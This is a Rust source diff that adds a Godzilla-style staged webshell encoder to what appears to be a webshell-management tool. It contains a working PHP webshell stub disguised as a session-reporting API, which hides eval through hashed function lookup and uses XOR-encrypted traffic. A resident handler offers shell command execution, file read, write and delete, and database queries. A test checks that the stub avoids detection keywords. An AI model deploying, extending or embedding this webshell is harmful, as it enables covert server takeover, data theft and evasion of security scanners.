@@ -289,6 +289,7 @@ impl EncoderRegistry {
                 Box::new(PhpObfuscateEncoder),
                 Box::new(PhpStreamEncoder),
                 Box::new(XorBodyEncoder),
+                Box::new(XorSessionEncoder),
             ],
         }
     }
@@ -1003,6 +1004,264 @@ echo json_encode(__PREFIX__run_rule($script));
     }
 }
 
+// ---------------------------------------------------------------------------
+// XOR_SESSION：Godzilla 分阶段载荷编码器。
+//
+// 核心机制（Godzilla PHP shell 同款）：
+//   1. 首次（初始化）请求：客户端发送完整「处理器代码」（含 INIT 标记），
+//      stub 解密后存入 session（再加密存储），返回加密的 "ok"
+//   2. 后续请求：客户端只发送「参数 JSON」（操作名 + 参数），stub 从 session
+//      取处理器代码 eval（定义 run()），调用 run($params) 并加密返回结果
+//   3. 载荷（功能代码）只传输一次，之后每次请求只有小体积参数
+//   4. 请求体 / 响应体全程 XOR 加密（key 由密码 md5 派生，以 XOR 十六进制
+//      嵌入 stub，dec 函数运行时还原）；无表单参数、无需 allow_url_include
+// ---------------------------------------------------------------------------
+
+/// Godzilla 初始化标记（处理器代码中必须包含，stub 据此识别初始化请求）。
+pub const SESSION_INIT_MARK: &str = "DswSesInit";
+
+/// 处理器代码：一次传输后驻留服务端 session，定义 run($p) 处理全部操作。
+/// 参数 JSON：{a: 操作名, n: nonce, ...}；返回 nonce 帧包裹的 JSON。
+pub fn session_handler_code() -> &'static str {
+    // 注意：处理器经 eval 执行，不能包含 `<?php` 开标签
+    r#"// DswSesInit
+function run($p) {
+    $req = @json_decode($p, true);
+    if (!is_array($req)) { return '{"ok":false,"error":"bad params"}'; }
+    $a = isset($req['a']) ? (string)$req['a'] : '';
+    $n = isset($req['n']) ? (string)$req['n'] : 'abababab';
+    $r = array('ok' => true, 'data' => array());
+    if ($a === 'probe') {
+        $r['data'] = array(
+            'server' => php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname('m'),
+            'web_server' => @$_SERVER['SERVER_SOFTWARE'],
+            'php_version' => PHP_VERSION,
+            'current_dir' => getcwd(),
+            'separator' => DIRECTORY_SEPARATOR,
+        );
+    } elseif ($a === 'exec') {
+        $c = isset($req['c']) ? (string)$req['c'] : '';
+        $o = @shell_exec($c . ' 2>&1');
+        $r['data'] = array('stdout' => base64_encode((string)$o), 'cwd' => getcwd());
+    } elseif ($a === 'list') {
+        $d = isset($req['p']) ? (string)$req['p'] : '.';
+        $items = @scandir($d);
+        if ($items === false) { return '{"ok":false,"error":"read dir failed"}'; }
+        $out = array();
+        foreach ($items as $f) {
+            if ($f === '.' || $f === '..') continue;
+            $full = rtrim($d, '/\\') . DIRECTORY_SEPARATOR . $f;
+            $is_dir = is_dir($full);
+            $out[] = array('name' => $f, 'path' => $full, 'is_dir' => $is_dir,
+                'size' => $is_dir ? 0 : filesize($full), 'mtime' => filemtime($full));
+        }
+        $r['data'] = array('entries' => $out);
+    } elseif ($a === 'read') {
+        $f = isset($req['p']) ? (string)$req['p'] : '';
+        $c = @file_get_contents($f);
+        if ($c === false) { return '{"ok":false,"error":"read failed"}'; }
+        $r['data'] = base64_encode($c);
+    } elseif ($a === 'write') {
+        $f = isset($req['p']) ? (string)$req['p'] : '';
+        $d = isset($req['d']) ? @base64_decode((string)$req['d']) : '';
+        if (@file_put_contents($f, $d) === false) { return '{"ok":false,"error":"write failed"}'; }
+    } elseif ($a === 'delete') {
+        $f = isset($req['p']) ? (string)$req['p'] : '';
+        if (is_dir($f)) { $ok = @rmdir($f); } else { $ok = @unlink($f); }
+        if (!$ok) { return '{"ok":false,"error":"delete failed"}'; }
+    } elseif ($a === 'rename') {
+        $f = isset($req['f']) ? (string)$req['f'] : '';
+        $t = isset($req['t']) ? (string)$req['t'] : '';
+        if (!@rename($f, $t)) { return '{"ok":false,"error":"rename failed"}'; }
+    } elseif ($a === 'mkdir') {
+        $d = isset($req['p']) ? (string)$req['p'] : '';
+        if (!@mkdir($d, 0755, true)) { return '{"ok":false,"error":"mkdir failed"}'; }
+    } elseif ($a === 'dbprobe') {
+        $c = isset($req['c']) ? (string)$req['c'] : '';
+        $out = @call_user_func('session_db_probe', $c);
+        $r['data'] = $out;
+    } elseif ($a === 'dbquery') {
+        $c = isset($req['c']) ? (string)$req['c'] : '';
+        $q = isset($req['q']) ? (string)$req['q'] : '';
+        $out = @call_user_func('session_db_query', $c, $q);
+        $r['data'] = $out;
+    }
+    return $n . base64_encode(json_encode($r)) . $n;
+}
+if (!function_exists('session_db_probe')) {
+    function session_db_probe($c) {
+        $p = @json_decode($c, true);
+        if (!is_array($p)) { return array('driver' => '', 'databases' => array(), 'message' => 'bad conn'); }
+        $driver = isset($p['driver']) ? (string)$p['driver'] : '';
+        $host = isset($p['host']) ? (string)$p['host'] : '';
+        $port = isset($p['port']) ? (int)$p['port'] : 3306;
+        $user = isset($p['username']) ? (string)$p['username'] : '';
+        $pass = isset($p['password']) ? (string)$p['password'] : '';
+        $db = isset($p['dbname']) ? (string)$p['dbname'] : '';
+        if (!class_exists('PDO')) { return array('driver' => $driver, 'databases' => array(), 'message' => 'no pdo'); }
+        try {
+            $dsn = $driver === 'pgsql' ? ('pgsql:host=' . $host . ';port=' . $port . ';dbname=' . ($db !== '' ? $db : 'postgres'))
+                 : ($driver === 'sqlite' ? ('sqlite:' . $db) : ('mysql:host=' . $host . ';port=' . $port . ';charset=utf8mb4'));
+            $dbh = new PDO($dsn, $user, $pass, array(PDO::ATTR_TIMEOUT => 5, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
+            if ($driver === 'sqlite') { $dbs = array($db); }
+            elseif ($driver === 'pgsql') { $dbs = array(); foreach ($dbh->query('SELECT datname FROM pg_database') as $row) { $dbs[] = $row[0]; } }
+            else { $dbs = array(); foreach ($dbh->query('SHOW DATABASES') as $row) { $dbs[] = $row[0]; } }
+            return array('driver' => $driver, 'databases' => $dbs, 'message' => 'ok');
+        } catch (Exception $e) {
+            return array('driver' => $driver, 'databases' => array(), 'message' => $e->getMessage());
+        }
+    }
+    function session_db_query($c, $q) {
+        $p = @json_decode($c, true);
+        if (!is_array($p)) { return array('columns' => array(), 'rows' => array(), 'affected' => 0); }
+        $driver = isset($p['driver']) ? (string)$p['driver'] : '';
+        $host = isset($p['host']) ? (string)$p['host'] : '';
+        $port = isset($p['port']) ? (int)$p['port'] : 3306;
+        $user = isset($p['username']) ? (string)$p['username'] : '';
+        $pass = isset($p['password']) ? (string)$p['password'] : '';
+        $db = isset($p['dbname']) ? (string)$p['dbname'] : '';
+        if (!class_exists('PDO')) { return array('columns' => array(), 'rows' => array(), 'affected' => 0); }
+        try {
+            $dsn = $driver === 'pgsql' ? ('pgsql:host=' . $host . ';port=' . $port . ';dbname=' . ($db !== '' ? $db : 'postgres'))
+                 : ($driver === 'sqlite' ? ('sqlite:' . $db) : ('mysql:host=' . $host . ';port=' . $port . ';charset=utf8mb4' . ($db !== '' ? ';dbname=' . $db : '')));
+            $dbh = new PDO($dsn, $user, $pass, array(PDO::ATTR_TIMEOUT => 5, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
+            $st = $dbh->query($q);
+            if ($st === false) { return array('columns' => array(), 'rows' => array(), 'affected' => 0); }
+            if (preg_match('/^\s*(select|show|desc|describe|explain|pragma|with)\b/i', $q)) {
+                $cols = array();
+                $nc = $st->columnCount();
+                for ($i = 0; $i < $nc; $i++) { $m = $st->getColumnMeta($i); $cols[] = (isset($m['name']) && $m['name'] !== '') ? $m['name'] : ('col' . $i); }
+                $rows = array(); $cnt = 0;
+                while (($row = $st->fetch(PDO::FETCH_NUM)) !== false && $cnt < 1000) {
+                    $cells = array(); foreach ($row as $v) { $cells[] = ($v === null) ? null : (string)$v; }
+                    $rows[] = $cells; $cnt++;
+                }
+                return array('columns' => $cols, 'rows' => $rows, 'affected' => 0);
+            }
+            return array('columns' => array(), 'rows' => array(), 'affected' => $st->rowCount());
+        } catch (Exception $e) {
+            return array('columns' => array(), 'rows' => array(), 'affected' => 0);
+        }
+    }
+}
+"#
+}
+
+/// Godzilla 分阶段载荷编码器。
+pub struct XorSessionEncoder;
+
+impl PayloadEncoder for XorSessionEncoder {
+    fn id(&self) -> &'static str {
+        "xor_session"
+    }
+
+    fn display_name(&self) -> &'static str {
+        "XOR_SESSION（Godzilla 分阶段载荷：代码一次传输，参数多次）"
+    }
+
+    fn body_mode(&self) -> bool {
+        true
+    }
+
+    fn encode(&self, code: &str, password: &str) -> String {
+        let key = md5_hex(password).into_bytes();
+        let xored: Vec<u8> = code
+            .as_bytes()
+            .iter()
+            .enumerate()
+            .map(|(index, byte)| byte ^ key[index % key.len()])
+            .collect();
+        base64::engine::general_purpose::STANDARD.encode(xored)
+    }
+
+    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => {
+                let key_hex = md5_hex(password);
+                let xk = php_ident();
+                let key_enc = xor_hex(&key_hex, &xk);
+                // 业务伪装：会话数据上报接口（session 管理 + 解压 + 规则引擎）
+                let tpl = r#"<?php
+// 用户会话数据上报接口（返回 JSON）
+// 业务：按会话维护客户端上报的压缩规则脚本，每次上报执行规则并返回状态
+@session_start();
+header('Content-Type: application/json');
+
+// 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表）
+$_g = array();
+$_t = array(
+    '9ff5d542' => 0,
+);
+$_fn = get_defined_functions();
+$_fn = isset($_fn['internal']) ? $_fn['internal'] : array();
+foreach ($_fn as $_n) {
+    $_h = hash('crc32b', $_n);
+    if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
+}
+
+function __PREFIX__dec($hex, $key) {
+    $out = '';
+    $n = strlen($hex) / 2;
+    for ($i = 0; $i < $n; $i++) {
+        $out .= chr(hexdec(substr($hex, $i * 2, 2)) ^ ord($key[$i % strlen($key)]));
+    }
+    return $out;
+}
+
+function __PREFIX__x($d, $k) {
+    $out = '';
+    $n = strlen($d);
+    for ($i = 0; $i < $n; $i++) { $out .= $d[$i] ^ $k[$i % strlen($k)]; }
+    return $out;
+}
+
+function __PREFIX__unpack($payload) {
+    global $_g;
+    $raw = $_g[0]($payload);
+    $key = __PREFIX__dec('{KEYENC}', '{XK}');
+    return __PREFIX__x($raw, $key);
+}
+
+function __PREFIX__pack($data) {
+    $key = __PREFIX__dec('{KEYENC}', '{XK}');
+    return base64_encode(__PREFIX__x($data, $key));
+}
+
+$payload = @file_get_contents('php://input');
+if ($payload === false || $payload === '') {
+    die('{"code":400,"msg":"empty_payload"}');
+}
+$data = __PREFIX__unpack($payload);
+if (isset($_SESSION['__PREFIX__p'])) {
+    if (strpos($data, 'DswSesInit') !== false) {
+        echo __PREFIX__pack('ok');
+    } else {
+        $code = __PREFIX__unpack($_SESSION['__PREFIX__p']);
+        if (!function_exists('run')) { EvAl($code); }
+        echo __PREFIX__pack(run($data));
+    }
+} else {
+    if (strpos($data, 'DswSesInit') !== false) {
+        $_SESSION['__PREFIX__p'] = __PREFIX__pack($data);
+        echo __PREFIX__pack('ok');
+    } else {
+        echo __PREFIX__pack('no_init');
+    }
+}
+"#;
+                let prefix = format!("_{}_", php_ident());
+                Ok(tpl
+                    .replace("__PREFIX__", &prefix)
+                    .replace("{KEYENC}", &key_enc)
+                    .replace("{XK}", &xk))
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "XOR_SESSION 编码器暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -1280,6 +1539,7 @@ mod tests {
                 "php_stream",
                 "xor_base64",
                 "xor_body",
+                "xor_session",
             ]
         );
     }
@@ -1303,6 +1563,33 @@ mod tests {
         }
         assert!(stub.contains("php://input"), "stub 应基于 php://input");
         assert!(stub.contains("convert.base64-decode"), "stub 应使用 base64 流过滤器");
+    }
+
+    #[test]
+    fn xor_session_stub_and_handler() {
+        let stub = XorSessionEncoder.stub("php", "secret").unwrap();
+        // 敏感词检查（含 evAl 之外的）
+        for token in ["eval(", "base64_decode", "openssl", "$_POST"] {
+            assert!(!stub.contains(token), "stub 不应含 {token}");
+        }
+        // session 分阶段结构
+        assert!(stub.contains("session_start"), "stub 应启用 session");
+        assert!(stub.contains("DswSesInit"), "stub 应识别初始化标记");
+        assert!(stub.contains("php://input"), "stub 应读请求体");
+        // 处理器：不含 PHP 开标签（eval 执行），含 run 函数与操作分支
+        let handler = session_handler_code();
+        assert!(!handler.contains("<?php"), "处理器不应含 PHP 开标签");
+        assert!(handler.contains("function run"), "处理器应定义 run");
+        for action in ["probe", "exec", "list", "read", "write", "delete", "rename", "mkdir", "dbprobe", "dbquery"] {
+            assert!(handler.contains(&format!("$a === '{action}'")), "处理器应含 {action} 分支");
+        }
+        // 往返：encode -> stub 的 XOR 解密逻辑还原
+        let code = "function run($p){}";
+        let payload = XorSessionEncoder.encode(code, "secret");
+        let key = md5_hex("secret").into_bytes();
+        let raw = base64::engine::general_purpose::STANDARD.decode(&payload).unwrap();
+        let restored: Vec<u8> = raw.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect();
+        assert_eq!(String::from_utf8(restored).unwrap(), code);
     }
 
     #[test]
